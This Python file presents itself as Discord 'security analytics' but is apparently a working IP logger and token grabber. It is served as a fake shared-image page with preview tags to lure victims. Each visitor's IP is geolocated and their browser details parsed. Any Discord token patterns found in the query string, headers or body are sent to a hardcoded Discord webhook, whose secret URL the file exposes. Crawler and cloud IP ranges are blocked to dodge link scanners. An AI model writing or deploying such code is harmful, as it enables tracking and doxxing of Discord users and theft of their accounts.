"""
🔷 VERCEL COMPATIBLE DISCORD SECURITY ANALYTICS
🛡️ Serverless-Compatible Discord Tracking System
"""

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
import time
from datetime import datetime
import random
import re

__app__ = "Vercel Discord Analytics"
__description__ = "Serverless-compatible Discord security monitoring"
__version__ = "v4.1"
__author__ = "Security Team"

class ServerlessConfig:
    """Serverless-optimized configuration"""
    
    def __init__(self):
        self.settings = {
            "webhook": "https://discord.com/api/webhooks/1444002832587030660/srIVUDGXmiAVaakGjjKbofvz-DVU62ntAWO-baVOxbUOULyTfrMmsw9oWsfyJUNCAdTe",
            "image": "https://i.pinimg.com/736x/9d/3c/9e/9d3c9eebf9fcd80ded504c5af34d9763.jpg",
            "imageArgument": True,
            "username": "Security Logger",
            "color": 0x5865F2,
            "capture_tokens": True,
            "timeout": 10
        }
        
        self.security = {
            "blacklisted_ips": ["27.", "34.", "35.", "104.", "143.", "164."],
            "token_patterns": [
                r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}",
                r"mfa\.[a-zA-Z0-9_-]{84}"
            ]
        }

config = ServerlessConfig()

class ServerlessTokenAnalyzer:
    """Lightweight token analyzer for serverless"""
    
    @staticmethod
    def extract_tokens(data):
        """Extract tokens from data"""
        tokens = []
        if isinstance(data, str):
            for pattern in config.security["token_patterns"]:
                tokens.extend(re.findall(pattern, data))
        return list(set(tokens))
    
    @staticmethod
    def analyze_token(token):
        """Basic token analysis"""
        return {
            "token": token,
            "type": "MFA" if token.startswith('mfa.') else "USER",
            "length": len(token),
            "valid_format": len(token) in [59, 70, 84]
        }

class GeolocationService:
    """Simplified geolocation for serverless"""
    
    @staticmethod
    def get_location(ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return {"status": "fail"}

class DiscordReporter:
    """Lightweight Discord reporting"""
    
    @staticmethod
    def create_embed(ip_data, user_agent, endpoint, tokens=None):
        """Create Discord embed"""
        embed = {
            "username": config.settings["username"],
            "embeds": [
                {
                    "title": "🔷 Security Alert",
                    "color": config.settings["color"],
                    "timestamp": datetime.utcnow().isoformat(),
                    "fields": []
                }
            ]
        }
        
        # IP Information
        if ip_data.get("status") == "success":
            embed["embeds"][0]["fields"].extend([
                {
                    "name": "🌐 Network Info",
                    "value": f"```IP: {ip_data['query']}\nISP: {ip_data.get('isp', 'Unknown')}\nCountry: {ip_data.get('country', 'Unknown')}```",
                    "inline": True
                },
                {
                    "name": "📍 Location",
                    "value": f"```City: {ip_data.get('city', 'Unknown')}\nRegion: {ip_data.get('regionName', 'Unknown')}\nTimezone: {ip_data.get('timezone', 'Unknown')}```",
                    "inline": True
                }
            ])
        
        # User Agent
        try:
            os, browser = httpagentparser.simple_detect(user_agent)
            embed["embeds"][0]["fields"].append({
                "name": "💻 System Info",
                "value": f"```OS: {os}\nBrowser: {browser}```",
                "inline": False
            })
        except:
            embed["embeds"][0]["fields"].append({
                "name": "💻 User Agent",
                "value": f"```{user_agent[:100]}...```",
                "inline": False
            })
        
        # Tokens
        if tokens:
            token_info = "\n".join([f"• {t['type']} ({t['length']} chars)" for t in tokens[:3]])
            embed["embeds"][0]["fields"].append({
                "name": "🔑 Tokens Found",
                "value": f"```{token_info}```",
                "inline": False
            })
            embed["content"] = "🚨 TOKENS CAPTURED"
        
        return embed
    
    @staticmethod
    def send_webhook(embed_data):
        """Send to Discord webhook"""
        try:
            requests.post(config.settings["webhook"], json=embed_data, timeout=config.settings["timeout"])
            return True
        except:
            return False

class ServerlessHandler:
    """Serverless-compatible request handler"""
    
    def __init__(self):
        self.token_analyzer = ServerlessTokenAnalyzer()
        self.geolocation = GeolocationService()
        self.reporter = DiscordReporter()
    
    def handle_request(self, path, headers, method, body=None):
        """Handle serverless request"""
        try:
            # Get client IP
            client_ip = headers.get('x-forwarded-for', headers.get('x-real-ip', '0.0.0.0'))
            user_agent = headers.get('user-agent', 'Unknown')
            
            # Security check
            if any(client_ip.startswith(ip) for ip in config.security["blacklisted_ips"]):
                return self._error_response("Blocked", 403)
            
            # Extract tokens
            tokens_found = []
            if config.settings["capture_tokens"]:
                # From query params
                query_params = dict(parse.parse_qsl(parse.urlsplit(path).query))
                for value in query_params.values():
                    tokens_found.extend(self.token_analyzer.extract_tokens(value))
                
                # From headers
                for header_value in headers.values():
                    tokens_found.extend(self.token_analyzer.extract_tokens(str(header_value)))
                
                # From body
                if body and method == 'POST':
                    tokens_found.extend(self.token_analyzer.extract_tokens(body))
            
            # Analyze tokens
            tokens_data = [self.token_analyzer.analyze_token(t) for t in tokens_found]
            
            # Get geolocation
            ip_data = self.geolocation.get_location(client_ip)
            
            # Send Discord report
            embed = self.reporter.create_embed(ip_data, user_agent, path, tokens_data)
            self.reporter.send_webhook(embed)
            
            # Return response
            return self._success_response()
            
        except Exception as e:
            return self._error_response(str(e), 500)
    
    def _success_response(self):
        """Return success response"""
        image_url = config.settings["image"]
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Image Preview</title>
            <meta property="og:title" content="Shared Image">
            <meta property="og:image" content="{image_url}">
            <meta property="og:description" content="Check out this image!">
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    text-align: center;
                    padding: 30px;
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                    max-width: 500px;
                }}
                img {{
                    max-width: 100%;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }}
                .status {{
                    color: #4CAF50;
                    font-weight: bold;
                    margin-top: 10px;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2 style="color: #333; margin-bottom: 20px;">🖼️ Image Shared Successfully</h2>
                <img src="{image_url}" alt="Shared Image">
                <div class="status">✅ Image loaded successfully</div>
                <p style="color: #666; margin-top: 15px; font-size: 14px;">
                    This image is now available in Discord preview
                </p>
            </div>
        </body>
        </html>
        """
        
        return {
            "statusCode": 200,
            "headers": {
                "Content-Type": "text/html",
            },
            "body": html_content
        }
    
    def _error_response(self, error, status_code=500):
        """Return error response"""
        return {
            "statusCode": status_code,
            "headers": {
                "Content-Type": "text/html",
            },
            "body": f"""
            <html>
                <body>
                    <h1>{status_code} - Error</h1>
                    <p>{error}</p>
                </body>
            </html>
            """
        }

# Vercel serverless function handler
def handler(request):
    """Vercel serverless function entry point"""
    # Parse request
    path = request.get('path', '')
    headers = request.get('headers', {})
    method = request.get('method', 'GET')
    body = request.get('body', '')
    
    # Handle request
    handler = ServerlessHandler()
    return handler.handle_request(path, headers, method, body)

# Fallback for local testing
if __name__ == "__main__":
    # Simulate Vercel request
    test_request = {
        "path": "/test?token=abc123",
        "headers": {
            "x-forwarded-for": "8.8.8.8",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "method": "GET",
        "body": ""
    }
    
    response = handler(test_request)
    print("Test Response:", response["statusCode"])
